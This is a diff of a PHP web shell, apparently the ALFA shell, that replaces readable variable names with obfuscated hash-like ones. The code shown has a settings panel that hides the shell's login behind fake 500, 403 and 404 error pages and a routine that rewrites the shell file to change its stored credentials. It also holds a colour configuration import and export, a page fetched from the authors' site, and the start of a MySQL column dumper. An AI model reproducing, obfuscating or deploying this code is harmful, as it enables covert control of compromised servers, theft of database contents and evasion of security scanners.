+foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$ttwwrvsa111778af60cb1093cf33144d64cd3f29 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
+foreach($gkzajztu7904b9622e24a4786d4f34a348e88997 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$cjnewkuz92666816abf61a64c2aa2a5c00286c55 .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
+foreach($gkzajztu7904b9622e24a4786d4f34a348e88997 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$zfynbafa89916c6dc3576acb72931b354faf1ccd .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
+$yesqidvyf0d722d106665c8f1db553d507140848 = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
+foreach($yesqidvyf0d722d106665c8f1db553d507140848 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)$ezsffanbe4ac821fee9d2c94c01acda0244a254f .= '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'" '.($GLOBALS['DB_NAME']['login_page']==$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d?'selected':'').'>'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
 echo '';
-echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
+echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$lbsfntjsb65581e7ecc28dd2657cc0a374aa555c.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cjnewkuz92666816abf61a64c2aa2a5c00286c55.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$zfynbafa89916c6dc3576acb72931b354faf1ccd.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$ttwwrvsa111778af60cb1093cf33144d64cd3f29.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$ezsffanbe4ac821fee9d2c94c01acda0244a254f.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
 if($_POST['alfa5']=='>>'){
 echo __pre();
 if(!empty($_POST['alfa3'])){
-$protect = $_POST['alfa1'];
-$lgpage = $_POST['alfa2'];
-$username = $_POST['alfa3'];
-$password = md5($_POST['alfa4']);
-$icon = $_POST['alfa6'];
-$post_encrypt = $_POST['alfa7'];
-$cgi_api_val = $_POST['alfa9'];
+$tpoirzry124c16e5bae30d956b37ef14c9a00ab4 = $_POST['alfa1'];
+$kvfnbqtn60f1901b22fb92ab95d93df632912ab5 = $_POST['alfa2'];
+$rgusbycx14c4b06b824ec593239362517f538b29 = $_POST['alfa3'];
+$oimndblx5f4dcc3b5aa765d61d8327deb882cf99 = md5($_POST['alfa4']);
+$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = $_POST['alfa6'];
+$edkasmem72e68941819905c4f1b0d191678b6dbd = $_POST['alfa7'];
+$nctzdszp17e4e3bd35ff08d25b44fe46bad7ab02 = $_POST['alfa9'];
 @chdir($GLOBALS['home_cwd']);
-$basename = @basename($_SERVER['PHP_SELF']);
-$data = @file_get_contents($basename);
-$user_rand = $GLOBALS["DB_NAME"]["user_rand"];
-$pass_rand = $GLOBALS["DB_NAME"]["pass_rand"];
-$login_page_rand = $GLOBALS["DB_NAME"]["login_page_rand"];
-$safemode_rand = $GLOBALS["DB_NAME"]["safemode_rand"];
-$show_icons_rand = $GLOBALS["DB_NAME"]["show_icons_rand"];
-$post_encryption_rand = $GLOBALS["DB_NAME"]["post_encryption_rand"];
-$cgi_api_rand = $GLOBALS["DB_NAME"]["cgi_api_rand"];
-$find_user = '/\''.$user_rand.'\'(.*?),/i';
-$find_pw = '/\''.$pass_rand.'\'(.*?),/i';
-$find_lg = '/\''.$login_page_rand.'\'(.*?),/i';
-$find_p = '/\''.$safemode_rand.'\'(.*?),/i';
-$icons = '/\''.$show_icons_rand.'\'(.*?),/i';
-$postEnc = '/\''.$post_encryption_rand.'\'(.*?),/i';
-$cgi_api_reg = '/\''.$cgi_api_rand.'\'(.*?),/i';
-if(!empty($username)&&preg_match($find_user,$data,$e)){
-$new = '\''.$user_rand.'\' => \''.$username.'\',';
-$data = str_replace($e[0],$new,$data);
+$reppeyoy954eb83bca864c64ee1e669dfab01c95 = @basename($_SERVER['PHP_SELF']);
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95);
+$wglifhps2e6f15f729aed69599b7ab9704b03e44 = $GLOBALS["DB_NAME"]["user_rand"];
+$mlmshhzj9c38b2924242facfa64af07983f64366 = $GLOBALS["DB_NAME"]["pass_rand"];
+$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60 = $GLOBALS["DB_NAME"]["login_page_rand"];
+$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139 = $GLOBALS["DB_NAME"]["safemode_rand"];
+$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb = $GLOBALS["DB_NAME"]["show_icons_rand"];
+$xprffgbw0adab3195ad5c84e053861c5143a0a9f = $GLOBALS["DB_NAME"]["post_encryption_rand"];
+$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd = $GLOBALS["DB_NAME"]["cgi_api_rand"];
+$ajswzkvz9889c9452a6e4e9c2a2455478687bd73 = '/\''.$wglifhps2e6f15f729aed69599b7ab9704b03e44.'\'(.*?),/i';
+$ozdqfsiud62cc31cc62ad4b8c563338e09281413 = '/\''.$mlmshhzj9c38b2924242facfa64af07983f64366.'\'(.*?),/i';
+$tfrmesvf0b98e4f57d62ecb053048ddcbcacda69 = '/\''.$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60.'\'(.*?),/i';
+$wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a = '/\''.$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139.'\'(.*?),/i';
+$wzabiadibd21190449b7e88db48fa0f580a8f666 = '/\''.$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb.'\'(.*?),/i';
+$pzlhelao3a742c88125fe704ce7326ddaa49ea05 = '/\''.$xprffgbw0adab3195ad5c84e053861c5143a0a9f.'\'(.*?),/i';
+$rwshrtyg4bbb039c69f322d6e3bb3c330f589176 = '/\''.$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd.'\'(.*?),/i';
+if(!empty($rgusbycx14c4b06b824ec593239362517f538b29)&&preg_match($ajswzkvz9889c9452a6e4e9c2a2455478687bd73,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$wglifhps2e6f15f729aed69599b7ab9704b03e44.'\' => \''.$rgusbycx14c4b06b824ec593239362517f538b29.'\',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(!empty($_POST['alfa4'])&&preg_match($find_pw,$data,$e)){
-$new = '\''.$pass_rand.'\' => \''.$password.'\',';
-$data = str_replace($e[0],$new,$data);
+if(!empty($_POST['alfa4'])&&preg_match($ozdqfsiud62cc31cc62ad4b8c563338e09281413,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$mlmshhzj9c38b2924242facfa64af07983f64366.'\' => \''.$oimndblx5f4dcc3b5aa765d61d8327deb882cf99.'\',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(!empty($lgpage)&&preg_match($find_lg,$data,$e)){
-$new = '\''.$login_page_rand.'\' => \''.$lgpage.'\',';
-$data = str_replace($e[0],$new,$data);
+if(!empty($kvfnbqtn60f1901b22fb92ab95d93df632912ab5)&&preg_match($tfrmesvf0b98e4f57d62ecb053048ddcbcacda69,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$gtmmwdpt6ee674eef2fabf34f10648c251d6fe60.'\' => \''.$kvfnbqtn60f1901b22fb92ab95d93df632912ab5.'\',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(!empty($find_p)&&preg_match($find_p,$data,$e)){
-$new = '\''.$safemode_rand.'\' => \''.$protect.'\',';
-$data = str_replace($e[0],$new,$data);
+if(!empty($wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a)&&preg_match($wblrmemte14b96d0aa2c2896bd32cdb9dea06b5a,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$nagxwcsv3eac9343fae7d4e4305eff4c76e9a139.'\' => \''.$tpoirzry124c16e5bae30d956b37ef14c9a00ab4.'\',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(preg_match($icons,$data,$e)){
-$new = '\''.$show_icons_rand.'\' => \''.$icon.'\',';
-$data = str_replace($e[0],$new,$data);
+if(preg_match($wzabiadibd21190449b7e88db48fa0f580a8f666,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$wwpfrkpib03e6ab3a4a73af73f455f914bd51bcb.'\' => \''.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'\',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(preg_match($postEnc,$data,$e)){
-$new = '\''.$post_encryption_rand.'\' => '.$post_encrypt.',';
-$data = str_replace($e[0],$new,$data);
+if(preg_match($pzlhelao3a742c88125fe704ce7326ddaa49ea05,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$xprffgbw0adab3195ad5c84e053861c5143a0a9f.'\' => '.$edkasmem72e68941819905c4f1b0d191678b6dbd.',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(preg_match($cgi_api_reg,$data,$e)){
-$new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
-$data = str_replace($e[0],$new,$data);
+if(preg_match($rwshrtyg4bbb039c69f322d6e3bb3c330f589176,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = '\''.$zbrxlvyh81280b1f794423ff3fd3bb550cd87fbd.'\' => '.$nctzdszp17e4e3bd35ff08d25b44fe46bad7ab02.',';
+$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 }
-if(@file_put_contents($basename,$data)){
-echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
+if(@file_put_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95,$sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
+echo '<b>UserName: </b><font color="green"><b>'.$rgusbycx14c4b06b824ec593239362517f538b29.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$edkasmem72e68941819905c4f1b0d191678b6dbd.';</script>';
 }else{
 __alert("<span style='color:red;'>File has no edit access...!</span>");
 }
@@ -1482,65 +1556,65 @@ __alert("<span style='color:red;'>UserName is Empty !</span>");
 }elseif($_POST["alfa8"] == "color"){
 echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
 echo '<table border="1"><tbody>';
-$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
-$x = 1;
-foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
-	$multi = "";
-	if(is_array($value)){
-		if(isset($value["multi_selector"])){
-			$multi = __ZW5jb2Rlcg(json_encode($value));
+$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6 = 1;
+foreach($GLOBALS['__ALFA_COLOR__'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+	$opnkqlyaea8f243d9885cf8ce9876a580224fd3c = "";
+	if(is_array($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
+		if(isset($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"])){
+			$opnkqlyaea8f243d9885cf8ce9876a580224fd3c = __ZW5jb2Rlcg(json_encode($rkptsoeg2063c1608d6e0baf80249c42e2be5804));
 		}
 	}
-	$value = alfa_getColor($key);
-	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
-	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
+	$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
+	$hjczuzba657f8b8da628ef83cf69101b6817150a = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d));
+	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($fyyftmba9dd4e461268c8034f5c8564e155c67a6++, $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $rkptsoeg2063c1608d6e0baf80249c42e2be5804, $opnkqlyaea8f243d9885cf8ce9876a580224fd3c, $hjczuzba657f8b8da628ef83cf69101b6817150a), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
 }
 echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';
 
-echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
+echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();"class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
 if($_POST['alfa7']=='export'){
 	echo __pre();
-	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
-	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
-	$array = array();
-	foreach($glob_colors as $k => $v){
-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
+	$qeleebga62848e3ce5804aa985513a7922ff87b2 = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
+	$ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 = $GLOBALS["__ALFA_COLOR__"];
+	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array();
+	foreach($ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
+		if(isset($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!empty($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!$ncztovoqf62baf4c4ead98d50d516eca0ac5a746){
+			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3]);
 		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
+			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim(is_array($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)?$hvlrcxnj9e3669d19b675bd57058fd4664205d2a["key_color"]:$hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
 		}
-		$array[$k] = $v;
+		$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
 	}
-	$file = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
-	$config = json_encode($array, JSON_PRETTY_PRINT);
-	if(!@file_put_contents($file, $config)){
-		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
+	$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
+	$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = json_encode($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5, JSON_PRETTY_PRINT);
+	if(!@file_put_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $yzrzmzyl2245023265ae4cf87d02c8b6ba991139)){
+		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$yzrzmzyl2245023265ae4cf87d02c8b6ba991139.'</textarea></center></p>');
 	}else{
-		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
+		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
 	}
 }
 if($_POST['alfa2']=='>>'){
 	echo __pre();
-	$colors = json_decode($_POST["alfa1"],true);
-	$array = "";
-	$is_default = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
-	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
-	foreach($glob_colors as $k => $v){
-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
+	$qeleebga62848e3ce5804aa985513a7922ff87b2 = json_decode($_POST["alfa1"],true);
+	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = "";
+	$ncztovoqf62baf4c4ead98d50d516eca0ac5a746 = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
+	$ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 = $GLOBALS["__ALFA_COLOR__"];
+	foreach($ixhxbzub2ce01a24556db85e099b3ed4a58d4f94 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
+		if(isset($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!empty($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3])&&!$ncztovoqf62baf4c4ead98d50d516eca0ac5a746){
+			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim($qeleebga62848e3ce5804aa985513a7922ff87b2[$damiszkt8ce4b16b22b58894aa86c421e8759df3]);
 		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
+			$hvlrcxnj9e3669d19b675bd57058fd4664205d2a = trim(is_array($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)?$hvlrcxnj9e3669d19b675bd57058fd4664205d2a["key_color"]:$hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
 		}
-		$array .= '"'.trim($k).'" => "'.$v.'",';
+		$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 .= '"'.trim($damiszkt8ce4b16b22b58894aa86c421e8759df3).'" => "'.$hvlrcxnj9e3669d19b675bd57058fd4664205d2a.'",';
 	}
 	@chdir($GLOBALS['home_cwd']);
-	$basename = @basename($_SERVER['PHP_SELF']);
-	$data = @file_get_contents($basename);
-	$color = '/\'color\'(.*?)\),/s';
-	if(preg_match($color,$data,$e)){
-		$new = "'color' => array(".$array."),";
-		$data = str_replace($e[0],$new,$data);
-		if(@file_put_contents($basename, $data)){
+	$reppeyoy954eb83bca864c64ee1e669dfab01c95 = @basename($_SERVER['PHP_SELF']);
+	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = @file_get_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95);
+	$jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd = '/\'color\'(.*?)\),/s';
+	if(preg_match($jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd,$sfmsaibm8d777f385d3dfec8815d20f7496026dc,$qxcuilgde1671797c52e15f763380b45e841ec32)){
+		$kcirdejs22af645d1859cb5ca6da0c484f1f37ea = "'color' => array(".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5."),";
+		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = str_replace($qxcuilgde1671797c52e15f763380b45e841ec32[0],$kcirdejs22af645d1859cb5ca6da0c484f1f37ea,$sfmsaibm8d777f385d3dfec8815d20f7496026dc);
+		if(@file_put_contents($reppeyoy954eb83bca864c64ee1e669dfab01c95, $sfmsaibm8d777f385d3dfec8815d20f7496026dc)){
 			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
 		}else{
 			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
@@ -1556,10 +1630,10 @@ alfafooter();
 function alfaaboutus(){
 alfahead();
 echo '<div class="header">';
-$news = new AlfaCURL();
-$about_us = $news->Send("http://solevisible.com/aboutus.php");
-if(empty($about_us)){
-$about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
+$fwuutsgy508c75c8507a2ae5223dfd2faeb98122 = new AlfaCURL();
+$mmbpvkfr54b9a8865a965755ad90cdab15541375 = $fwuutsgy508c75c8507a2ae5223dfd2faeb98122->Send("http://solevisible.com/aboutus.php");
+if(empty($mmbpvkfr54b9a8865a965755ad90cdab15541375)){
+$mmbpvkfr54b9a8865a965755ad90cdab15541375 = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
@@ -1571,7 +1645,7 @@ $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.
 <font color='#FF0000'>############</font><br>
 </center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
 }
-echo __pre().$about_us;
+echo __pre().$mmbpvkfr54b9a8865a965755ad90cdab15541375;
 echo('</div>');
 alfafooter();
 }
@@ -1580,100 +1654,100 @@ alfahead();
 echo('<div class="header">');
 AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
-$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
-$selected_data = json_decode($_POST['alfa2'], true);
-$username = ($_POST['alfa3']);
-$password = ($_POST['alfa4']);
-$dbname = ($_POST['alfa5']);
-$dfile = ($_POST['alfa6']);
-$host = ($_POST['alfa7']);
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
